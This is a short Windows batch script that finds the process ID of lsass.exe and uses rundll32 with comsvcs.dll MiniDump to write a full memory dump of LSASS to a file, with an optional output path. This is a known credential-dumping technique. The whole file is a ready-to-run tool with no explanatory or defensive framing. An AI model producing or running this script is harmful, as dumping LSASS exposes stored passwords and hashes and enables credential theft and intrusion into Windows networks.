@echo off
setlocal EnableDelayedExpansion

if "%~1"=="" goto :default

set OUTFILE=%~f1
if "!OUTFILE:~-1!"=="\" set OUTFILE=!OUTFILE:~0,-1!
if exist "!OUTFILE!\" set OUTFILE=!OUTFILE!\lsass_comsvcs.dmp
goto :run

:default
set OUTFILE=%~dp0lsass_comsvcs.dmp

:run
for /f "tokens=2" %%i in ('C:\Windows\System32\tasklist.exe /fi "imagename eq lsass.exe" /nh') do set PID=%%i
echo LSASS PID: %PID%
C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump %PID% "!OUTFILE!" full
echo Done.
dir "!OUTFILE!"
